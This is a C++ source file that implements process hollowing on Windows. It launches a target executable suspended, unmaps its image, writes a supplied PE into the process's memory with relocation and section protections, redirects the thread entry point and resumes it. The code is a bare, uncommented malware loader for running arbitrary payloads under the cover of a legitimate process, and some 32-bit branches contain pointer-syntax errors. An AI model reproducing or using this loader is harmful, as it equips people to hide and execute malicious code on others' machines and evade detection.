/**
 * hollow.cpp
 **/

#include <windows.h>
#include "hollow.h"

/* ... */
typedef struct pe_module {
    PIMAGE_DOS_HEADER dos_hdr;
    PIMAGE_NT_HEADERS nt_hdrs;
#ifdef _WIN64
    unsigned long long base;
#else
    unsigned long base;
#endif
} pe_module_t;

/* ... */
typedef struct process {
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION proc_info;
    CONTEXT thread_ctx;
} process_t;

/* ... */
void pe_module_init(pe_module_t *pem, pe_data_t *pe_data);

/* ... */
int pe_module_allocate(pe_module_t *pem, process_t *proc, void **alloc_base);

/* ... */
int pe_module_relocate(pe_module_t *pem, pe_data_t *pe_data, void *alloc_base);

/* ... */
int pe_module_write_headers(pe_module_t *pem, process_t *proc, pe_data_t *pe_data, void *alloc_base);

/* ... */
int pe_module_write_sections(pe_module_t *pem, process_t *proc, pe_data_t *pe_data, void *alloc_base);

/* ... */
int process_init(process_t *proc, char *target);

/* ... */
int process_set_thread_ctx(process_t *proc, pe_module_t *pem, void *alloc_base);

int pe_data_hollow(pe_data_t *pe_data, char *target)
{
    pe_module_t pem;
    pe_module_init(&pem, pe_data);

    process_t proc;
    if (!process_init(&proc, target)) {
        return 0;
    }

    void *alloc_base;
    if (!pe_module_allocate(&pem, &proc, &alloc_base)) {
        return 0;
    }

    if (!pe_module_relocate(&pem, pe_data, alloc_base)) {
        return 0;
    }

    if (!process_set_thread_ctx(&proc, &pem, alloc_base)) {
        return 0;
    }

    if (!pe_module_write_headers(&pem, &proc, pe_data, alloc_base)) {
        return 0;
    }

    if (!pe_module_write_sections(&pem, &proc, pe_data, alloc_base)) {
        return 0;
    }

    if (ResumeThread(proc.proc_info.hThread) == -1) {
        return 0;
    }

    return 1;
}

void pe_module_init(pe_module_t *pem, pe_data_t *pe_data)
{
    pem->dos_hdr = (PIMAGE_DOS_HEADER)pe_data->bytes;
    pem->nt_hdrs = (PIMAGE_NT_HEADERS)((LONG_PTR)pe_data->bytes + pem->dos_hdr->e_lfanew);
    pem->base = pem->nt_hdrs->OptionalHeader.ImageBase;
}

int pe_module_allocate(pe_module_t *pem, process_t *proc, void **alloc_base)
{
#ifdef _WIN64
	void *img_base = (LPVOID)(proc->thread_ctx.Rdx + 2 * sizeof(unsigned long long));
    unsigned long long orig_base;
#else
	void *img_base = (LPVOID)(proc.thread_ctx.Ebx + 2 * sizeof(unsigned long));
    unsigned long orig_base;
#endif

    size_t num_bytes;
    if (!ReadProcessMemory(proc->proc_info.hProcess, img_base, &orig_base, sizeof(orig_base), &num_bytes)) {
        return 0;
    }

    if ((void*)orig_base == (void*)pem->base) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        FARPROC unm_vw_of_sec = GetProcAddress(ntdll, "NtUnmapViewOfSection");

        if ((*(long(*)(void*, void*))unm_vw_of_sec)(proc->proc_info.hProcess, (void*)orig_base)) {
            return 0;
        }
    }

    if (!(*alloc_base = VirtualAllocEx(proc->proc_info.hProcess, (void*)pem->base,
            pem->nt_hdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
        if (GetLastError() == ERROR_INVALID_ADDRESS) {
            if (!(*alloc_base = VirtualAllocEx(proc->proc_info.hProcess, NULL, pem->nt_hdrs->OptionalHeader.SizeOfImage,
                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
                return 0;
            }
        }
        else {
            return 0;
        }
    }

    if ((void*)orig_base != *alloc_base) {
        if (!WriteProcessMemory(proc->proc_info.hProcess, img_base, alloc_base, sizeof(*alloc_base), &num_bytes)) {
            return 0;
        }
    }

    return 1;
}

int pe_module_relocate(pe_module_t *pem, pe_data_t *pe_data, void *alloc_base)
{
    pem->nt_hdrs->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

    if (alloc_base == (void*)pem->base) {
        return 1;
    }

    if (pem->nt_hdrs->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) {
        return 0;
    }

#ifdef _WIN64
    pem->nt_hdrs->OptionalHeader.ImageBase = (unsigned long long)alloc_base;
#else
    pem->nt_hdrs->OptionalHeader.ImageBase = (unsigned long)alloc_base;
#endif

    PIMAGE_SECTION_HEADER sec_hdr = IMAGE_FIRST_SECTION(pem->nt_hdrs);

    unsigned long reloc_tbl_rva =
            pem->nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    unsigned long reloc_tbl_offs = 0;

    for (unsigned long i = 0; i < pem->nt_hdrs->FileHeader.NumberOfSections; ++i) {
        if (reloc_tbl_rva >= sec_hdr[i].VirtualAddress &&
                reloc_tbl_rva < sec_hdr[i].VirtualAddress + sec_hdr[i].Misc.VirtualSize) {
            reloc_tbl_offs = sec_hdr[i].PointerToRawData + reloc_tbl_rva - sec_hdr[i].VirtualAddress;
            break;
        }
    }

    void *reloc_tbl = (void*)((DWORD_PTR)pe_data->bytes + reloc_tbl_offs);
    unsigned long reloc_tbl_size = pem->nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    unsigned long i = 0;
    while (i < reloc_tbl_size) {
        IMAGE_BASE_RELOCATION *reloc_block = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)reloc_tbl + i);
        void *block_entry = (void*)((DWORD_PTR)reloc_block + sizeof(reloc_block->SizeOfBlock) +
                sizeof(reloc_block->VirtualAddress));

        unsigned long num_blocks = (reloc_block->SizeOfBlock - sizeof(reloc_block->SizeOfBlock) -
                sizeof(reloc_block->VirtualAddress)) / sizeof(unsigned short);
        unsigned short *blocks = (unsigned short*)block_entry;
        
        for (unsigned long j = 0; j < num_blocks; ++j) {
            unsigned short block_type = (blocks[j] & 0xf000) >> 0xc;
            unsigned short block_offs = blocks[j] & 0xfff;

            if (block_type == IMAGE_REL_BASED_HIGHLOW || block_type == IMAGE_REL_BASED_DIR64) {
                unsigned long addr_fix_rva = reloc_block->VirtualAddress + (unsigned long)block_offs;
                unsigned long addr_fix_offs = 0;

                for (unsigned long k = 0; k < pem->nt_hdrs->FileHeader.NumberOfSections; ++k) {
                    if (addr_fix_rva >= sec_hdr[k].VirtualAddress &&
                            addr_fix_rva < sec_hdr[k].VirtualAddress + sec_hdr[k].Misc.VirtualSize) {
                        addr_fix_offs = sec_hdr[k].PointerToRawData + addr_fix_rva - sec_hdr[k].VirtualAddress;
                        break;
                    }
                }

#ifdef _WIN64
                unsigned long long *addr_fix = (unsigned long long*)((DWORD_PTR)pe_data->bytes + addr_fix_offs);
                *addr_fix += (unsigned long long)alloc_base - pem->base;
#else
                unsigned long *addr_fix = (unsigned long*)((DWORD_PTR)pe_data->bytes + addr_fix_offs);
                *addr_fix += (unsigned long)alloc_base - pem->base;
#endif
            }
        }

        i += reloc_block->SizeOfBlock;
    }

    return 1;
}

int pe_module_write_headers(pe_module_t *pem, process_t *proc, pe_data_t *pe_data, void *alloc_base)
{
    size_t num_bytes;
    if (!WriteProcessMemory(proc->proc_info.hProcess, alloc_base, (void*)pe_data->bytes,
            pem->nt_hdrs->OptionalHeader.SizeOfHeaders, &num_bytes)) {
        return 0;
    }

    unsigned long old_prot;
    if (!VirtualProtectEx(proc->proc_info.hProcess, alloc_base, pem->nt_hdrs->OptionalHeader.SizeOfHeaders,
            PAGE_READONLY, &old_prot)) {
        return 0;
    }

    return 1;
}

int pe_module_write_sections(pe_module_t *pem, process_t *proc, pe_data_t *pe_data, void *alloc_base)
{
    IMAGE_SECTION_HEADER *sec_hdrs = (IMAGE_SECTION_HEADER*)((ULONG_PTR)pe_data->bytes + pem->dos_hdr->e_lfanew +
            sizeof(IMAGE_NT_HEADERS));

    for (int i = 0; i < pem->nt_hdrs->FileHeader.NumberOfSections; ++i) {
#ifdef _WIN64
        void *sec_addr = (void*)((unsigned long long)alloc_base + sec_hdrs[i].VirtualAddress);
#else
        void *sec_addr = (void*)((unsigned long)alloc_base + sec_hdrs[i].VirtualAddress);
#endif
        size_t num_bytes;
        if (!WriteProcessMemory(proc->proc_info.hProcess, sec_addr,
                (const void*)((DWORD_PTR)pe_data->bytes + sec_hdrs[i].PointerToRawData), sec_hdrs[i].SizeOfRawData,
                &num_bytes)) {
            return 0;
        }

        unsigned long sec_size = 0;
        if (i == pem->nt_hdrs->FileHeader.NumberOfSections - 1) {
            sec_size = pem->nt_hdrs->OptionalHeader.SizeOfImage - sec_hdrs[i].VirtualAddress;
        }
        else {
            sec_size = sec_hdrs[i + 1].VirtualAddress - sec_hdrs[i].VirtualAddress;
        }
        
        unsigned long sec_characteristics = sec_hdrs[i].Characteristics;
        unsigned long sec_prot = PAGE_NOACCESS;

        if (sec_characteristics & IMAGE_SCN_MEM_EXECUTE && sec_characteristics & IMAGE_SCN_MEM_READ &&
                sec_characteristics & IMAGE_SCN_MEM_WRITE) {
            sec_prot = PAGE_EXECUTE_READWRITE;
        }
        else if (sec_characteristics & IMAGE_SCN_MEM_EXECUTE && sec_characteristics & IMAGE_SCN_MEM_READ) {
            sec_prot = PAGE_EXECUTE_READ;
        }
        else if (sec_characteristics & IMAGE_SCN_MEM_EXECUTE && sec_characteristics & IMAGE_SCN_MEM_WRITE) {
            sec_prot = PAGE_EXECUTE_WRITECOPY;
        }
        else if (sec_characteristics & IMAGE_SCN_MEM_READ && sec_characteristics & IMAGE_SCN_MEM_WRITE) {
            sec_prot = PAGE_READWRITE;
        }
        else if (sec_characteristics & IMAGE_SCN_MEM_EXECUTE) {
            sec_prot = PAGE_EXECUTE;
        }
        else if (sec_characteristics & IMAGE_SCN_MEM_READ) {
            sec_prot = PAGE_READONLY;
        }
        else if (sec_characteristics & IMAGE_SCN_MEM_WRITE) {
            sec_prot = PAGE_WRITECOPY;
        }

        unsigned long old_prot;
        if (!VirtualProtectEx(proc->proc_info.hProcess, sec_addr, sec_size, sec_prot, &old_prot)) {
            return 0;
        }
    }

    return 1;
}

int process_init(process_t *proc, char *target)
{
    if (!CreateProcessA(target, NULL, NULL, NULL, false, CREATE_SUSPENDED,
		    NULL, NULL, &proc->startup_info, &proc->proc_info)) {
		return 0;
	}

    memset(&proc->thread_ctx, 0, sizeof(proc->thread_ctx));
    proc->thread_ctx.ContextFlags = CONTEXT_INTEGER;

    if (!GetThreadContext(proc->proc_info.hThread, &proc->thread_ctx)) {
		return 0;
	}

    return 1;
}

int process_set_thread_ctx(process_t *proc, pe_module_t *pem, void *alloc_base)
{
#ifdef _WIN64
    proc->thread_ctx.Rcx = (unsigned long long)alloc_base + pem->nt_hdrs->OptionalHeader.AddressOfEntryPoint;
#else
    proc.thread_ctx.Eax = (unsigned long)alloc_base + pem.nt_hdrs->OptionalHeader.AddressOfEntryPoint;
#endif

    if (!SetThreadContext(proc->proc_info.hThread, &proc->thread_ctx)) {
        return 0;
    }

    return 1;
}